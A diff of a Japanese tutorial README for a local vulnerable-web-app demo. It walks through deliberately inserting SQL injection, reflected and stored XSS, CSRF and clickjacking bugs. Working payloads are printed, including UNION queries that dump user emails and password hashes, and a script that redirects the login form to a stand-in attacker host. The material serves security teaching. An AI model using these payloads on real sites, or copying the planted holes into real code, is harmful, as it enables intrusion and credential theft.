@@ -28,17 +28,9 @@ Firefoxで http://localhost:8080/ にアクセスすると使えます。
 - パスワード
   - password1
 
-ログインに成功すると、商品一覧が表示されます。
+ログインに成功すると、商品一覧が表示されます。URLは`http://localhost:8080/products`です。
 
-```
-http://localhost:8080/products
-```
-
-商品の詳細ページでは、商品の購入とレビューの投稿ができます。
-
-```
-http://localhost:8080/products/1
-```
+商品の詳細ページでは、商品の購入とレビューの投稿ができます。URLは`http://localhost:8080/products/1`です。
 
 なお、購入は簡易的な実装で、アラートが表示されるだけです。
 レビューは評価とコメントを投稿できます。投稿したものを削除することもできます。
@@ -67,25 +59,31 @@ localhostに別名を割り当てるのによく使うのはhostsファイルで
 
 他には```lvh.me```というドメイン名が有名です。ただし、これらのドメインはドメインの管理者の気まぐれでいつ使えなくなってもおかしくないので注意してください。
 
-## SQLインジェクション
+## このデモで試す脆弱性
+
+- Step1: SQLインジェクション
+- Step2: 反射型クロスサイトスクリプティング（XSS）
+- Step3: クロスサイトリクエストフォージェリ（CSRF）
+- Step4: 蓄積型XSS
+- Step5: クリックジャッキング
+
+## 1. SQLインジェクション
 
 ここからは、未熟な開発者がバグを埋め込んでしまった、と仮定して、バグありのコードに書き換えていきます。
 
-```app.js```を次のように書き換えます。プレースホルダ```?```（はてな）を使わずに、文字列を連結してSQL文を作ってしまっています。
+`Step1`で検索して、`app.js`を次のように書き換えます。プレースホルダ`?`（はてな）を使わずに、文字列を連結してSQL文を作ってしまっています。
 
 ```diff
-        // SQLインジェクション対策
+        // Step1: SQLインジェクション対策
 -        db.all("SELECT * FROM rated_products WHERE name LIKE ?;", "%" + query + "%", (err, rows) => {
 +        db.all("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'", (err, rows) => {
 ```
 
 Firefoxで商品一覧を表示します。
 
-```
-http://localhost:8080/products
-```
+<a target="_blank" href="http://localhost:8080/products">http://localhost:8080/products</a>
 
-商品名で検索ができます。例えば、```1```で検索すると商品1が表示されます。
+商品名で検索ができます。例えば、検索欄に`1`を入力して検索すると商品1が表示されます。
 攻撃者は内部の動作を想像し、システムが次のようなSQL文を使っているのではないか？と推測します。
 
 ```sql
@@ -102,9 +100,7 @@ SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE ''%';
 攻撃者の期待通りなら、LIKEの条件が間違ったおかしなSQL文となり、エラーが表示されるはずです。
 では、シングルクォートで検索してみましょう。次の URL にアクセスしても構いません。
 
-```
-http://localhost:8080/products?q='
-```
+<a target="_blank" href="http://localhost:8080/products?q='">http://localhost:8080/products?q='</a>
 
 すると、Error: 500 Internal Server Errorが表示されます。攻撃者が入力した文字列がエスケープされることなく、そのままSQL文として使われてしまう脆弱性があることが示唆されました。この脆弱性を使った攻撃をSQLインジェクションと呼びます。
 
@@ -126,15 +122,11 @@ UNIONは2つのSELECTを統合するときに使います。前半のSELECTで�
 
 よって、検索する文字列は```x%' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--```となります。これを検索窓に入力するか、パーセントエンコードした以下のURLにアクセスします。
 
-```
-http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+tbl_name%2C+sql%2C+1%2C+1%2C+1+FROM+sqlite_master--
-```
+<a target="_blank" href="http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+tbl_name%2C+sql%2C+1%2C+1%2C+1+FROM+sqlite_master--">http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+tbl_name%2C+sql%2C+1%2C+1%2C+1+FROM+sqlite_master--</a>
 
 画面に表示される検索結果から、usersテーブルがあることと、そのカラム名が分かりました。ここからさらに情報を引き出します。検索する文字列は`x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--`です。
 
-```
-http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+id%2C+email%2C+1%2C+hashed_password%2C+nickname+FROM+users--
-```
+<a target="_balnk" href="http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+id%2C+email%2C+1%2C+hashed_password%2C+nickname+FROM+users--">http://localhost:8080/products?q=x%25%27+UNION+SELECT+1%2C+id%2C+email%2C+1%2C+hashed_password%2C+nickname+FROM+users--</a>
 
 usersテーブルのid、email、hashed_password、nicknameが漏洩してしまいました。かろうじてパスワードをハッシュ化していましたが、平文で保存していたら目も当てられません。
 
@@ -150,37 +142,34 @@ usersテーブルのid、email、hashed_password、nicknameが漏洩してしま
 > 
 > [![](http://img.youtube.com/vi/Vvgmeu128ak/0.jpg)](http://www.youtube.com/watch?v=Vvgmeu128ak "")
 
-## 反射型クロスサイトスクリプティング（Reflected XSS）
+## 2. 反射型クロスサイトスクリプティング（Reflected XSS）
 
 それでは、次のバグを埋め込んでみます。たった1文字が紛れ込むことで、攻撃が可能になってしまう例です。
 ```app.js```を次のように書き換えます。画面に表示する変数```message```のエスケープ漏れです。EJSのテンプレートで`<%- %>`は、変数をエスケープせず生のまま表示することを意味します。
 
 
 ```diff
-<!-- XSS対策 -->
+<!-- Step2: XSS対策 -->
 -<p style="color:red;"> <%= message %> </p>
 +<p style="color:red;"> <%- message %> </p>
 ```
 
 攻撃者は、ログイン画面でURLのquery parameterとして渡した文字列が画面に表示されていることに着目し、query parameterの扱いが雑になっていることを期待して、次のようなURLでアクセスしてきます。HTMLで```\<s\>```タグは取り消し線を意味します。
 
-```
-http://localhost:8080/login?message=<s>hello</s>
-```
+<a target="_blank" href="http://localhost:8080/login?message=<s>hello</s>">http://localhost:8080/login?message=\<s\>hello\</s\></a>
 
 取り消されたhelloが表示され、エスケープ漏れがあることが分かりました。次に期待するのはスクリプトの混入です。
 
-```
-http://localhost:8080/login?message=<script>alert(1)</script>
-```
+<a target="_blank" href="http://localhost:8080/login?message=<script>alert(1)</script>">http://localhost:8080/login?message=\<script\>alert(1)\</script\></a>
 
-```1```がアラートされ、スクリプトの混入に成功したことが分かります。このように、別のサイト（クロスサイト）からスクリプトを混入できる脆弱性を狙った攻撃を、クロスサイト・スクリプティング（Xross Site Scripting: XSS、もしくは、Cross Site Scripting: CSS）と呼びます。
+
+`1`がアラートされ、スクリプトの混入に成功したことが分かります。このように、別のサイト（クロスサイト）からスクリプトを混入できる脆弱性を狙った攻撃を、クロスサイト・スクリプティング（Xross Site Scripting: XSS、もしくは、Cross Site Scripting: CSS）と呼びます。
 
 上記したように、URL自体にスクリプトを混入するXSSは反射型（Reflected）XSSと呼ばれます。詳しくは後ほど解説します。
 
 攻撃者は自分の持つ攻撃用サイトを立ち上げ、正規の利用者が正規のログイン画面に入力した情報を盗み出すことを思いつきます。
 
-攻撃用サイトを起動するには、別のコマンドプロンプトを立ち上げて、```evil.js```を実行します。成功すればevil.localtest.meというホスト名の8081ポートで起動します。起動に失敗したり、起動できてもFirefoxからアクセスできない場合には、すでに8081番ポートが使われている可能性があります。例えば、8082など、別のポート番号にコードを書き換えて起動しなおしてください。```evil.js```の```PORT```の値を変更します。
+攻撃用サイトを起動するには、別のコマンドプロンプトを立ち上げて、`evil.js`を実行します（Dockerを使っている場合すでに起動しています）。成功すればevil.localtest.meというホスト名の8081ポートで起動します。起動に失敗したり、起動できてもFirefoxからアクセスできない場合には、すでに8081番ポートが使われている可能性があります。例えば、8082など、別のポート番号にコードを書き換えて起動しなおしてください。`evil.js`の`PORT`の値を変更します。
 
 ```console
 $ node evil.js
@@ -188,9 +177,7 @@ $ node evil.js
 
 XSSが成功すると、攻撃者がログイン画面にスクリプトを混入できるので、同じログイン画面にもかかわらずフォームの登録先サーバーを変更できてしまいます。正規の利用者が次のURLをクリックすると、画面上は何も変わりがありませんが、実は向き先の変わっているログイン画面が表示されます。
 
-```
-http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>
-```
+<a target="_blank" href="http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>">http://localhost:8080/login?message=\<script\>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}\</script\></a>
 
 上記のURLに仕込まれているスクリプトを書き下すと、次のようになります。
 
@@ -204,15 +191,11 @@ window.onload はページの読み込みが終了すると実行されます。
 
 攻撃者はこのスクリプトが混入したURLを、正規の利用者に何とかクリックさせようと試みます。例えば、攻撃用サイトを使って、甘い言葉で正規の利用者にクリックを促します。
 
-```
-http://evil.localtest.me:8081/game0
-```
+<a target="_blank" href="http://evil.localtest.me:8081/game0">http://evil.localtest.me:8081/game0</a>
 
 利用者が送信ボタンを押してしまうと入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報をFirefoxで確認してみましょう。これまでに集めた情報の一覧が表示されます。
 
-```
-http://evil.localtest.me:8081/users
-```
+<a target="_blank" href="http://evil.localtest.me:8081/users">http://evil.localtest.me:8081/users</a>
 
 ### XSSを防ぐには
 
@@ -235,14 +218,14 @@ Webブラウザーが持つセキュリティ機能を、Webアプリ側が強�
 > 
 > https://developer.mozilla.org/ja/docs/Web/HTTP/CSP
 
-## クロスサイト・リクエストフォージェリ（CSRF）と蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技
+## 3. クロスサイト・リクエストフォージェリ（CSRF）、4. 蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技
 
 このセクションはWebブラウザーにFirefoxを使います。
 
-```app.js```を次のよう書き換えます。
+`app.js`を次のよう書き換えます。
 
 ```diff
-            // CSRF対策
+            // Step3: CSRF対策
 -            res.cookie('userId', row.id, { signed: true, path: '/', httpOnly: true, sameSite: 'lax' })
 -            res.cookie('nickname', row.nickname, { signed: true, path: '/', httpOnly: true, sameSite: 'lax' })
 +            res.cookie('userId', row.id, { signed: true, path: '/', httpOnly: true, sameSite: 'none' })
@@ -262,9 +245,7 @@ Webブラウザーが持つセキュリティ機能を、Webアプリ側が強�
 
 攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
-```
-http://evil.localtest.me:8081/game1
-```
+<a target="_blank" href="http://evil.localtest.me:8081/game1">http://evil.localtest.me:8081/game1</a>
 
 クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。
 
@@ -284,25 +265,21 @@ http://evil.localtest.me:8081/game1
 
 意図しない投稿は商品1のレビューです。確認してみます。
 
-```
-http://localhost:8080/products/1
-```
+<a target="_blank" href="http://localhost:8080/products/1">http://localhost:8080/products/1</a>
 
 なお、samesite属性のデフォルト値はlaxなので、samesite属性そのものを削除しているのであればこの攻撃が成立せず、ログインが求められることになります。
 
-さらに```app.js```を書き換え、```comment```のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。
+さらに`app.js`を書き換え、`comment`のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。
 
 ```diff
-    <!-- XSS対策 -->
+    <!-- Step4: XSS対策 -->
 -    <li><%= comment %></li>
 +    <li><%- comment %></li>
 ```
 
 攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
-```
-http://evil.localtest.me:8081/game2
-```
+<a target="_blank" href="http://evil.localtest.me:8081/game2">http://evil.localtest.me:8081/game2</a>
 
 クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。
 
@@ -318,6 +295,10 @@ http://evil.localtest.me:8081/game2
   <input type="submit" value="遊んでみる" />
 </form>
 ```
+
+再び、商品1の詳細ページを確認してみましょう。
+
+<a target="_blank" href="http://localhost:8080/products/1">http://localhost:8080/products/1</a>
 
 利用者が意図せずに投稿してしまったスクリプト付きコメントは、利用者本人はもちろん、他の利用者がこのコメントを閲覧した時にも実行され、金額を書き換えてしまいます。
 
@@ -371,25 +352,23 @@ if form_token != cookie_token:
 > 
 > [![](http://img.youtube.com/vi/ryztmcFf01Y/0.jpg)](http://www.youtube.com/watch?v=ryztmcFf01Y "")
 
-## クリックジャッキング（Clickjacking）
+## 5. クリックジャッキング（Clickjacking）
 
 このセクションはWebブラウザーにFirefoxを使います。
 
 前のセクションでクッキーのsamesite属性をnoneにした後に、```app.js```を次のよう書き換えます。X-Frame-Optionsヘッダーのヘッダー名を間違え、sを抜かしたX-Frame-Optionにしてしまいました。
 
-HTMLの```\<iframe\>```タグを使うことで、別のサイトのWebページを自サイト上に掲載することができます。X-Frame-Optionsヘッダーは、別のサイトがiframe内にそのページを表示してよいかどうかを設定します。ヘッダー名を間違えてしまったので有効にならず、誰でもそのページをiframe内に表示することができるようになってしまいました。
+HTMLの`\<iframe\>`タグを使うことで、別のサイトのWebページを自サイト上に掲載することができます。X-Frame-Optionsヘッダーは、別のサイトがiframe内にそのページを表示してよいかどうかを設定します。ヘッダー名を間違えてしまったので有効にならず、誰でもそのページをiframe内に表示することができるようになってしまいました。
 
 ```diff
-    // Clickjacking対策
+    // Step5: Clickjacking対策
 -    res.header('X-Frame-Options', 'DENY')
 +    res.header('X-Frame-Option', 'DENY')
 ```
 
 攻撃者は攻撃用サイトを準備し、甘い言葉で正規の利用者にクリックを促します。
 
-```
-http://evil.localtest.me:8081/game3
-```
+<a target="_blank" href="http://evil.localtest.me:8081/game3">http://evil.localtest.me:8081/game3</a>
 
 攻撃用サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規の利用者がボタンをクリックすると、勝手に商品を購入してしまいます。
 
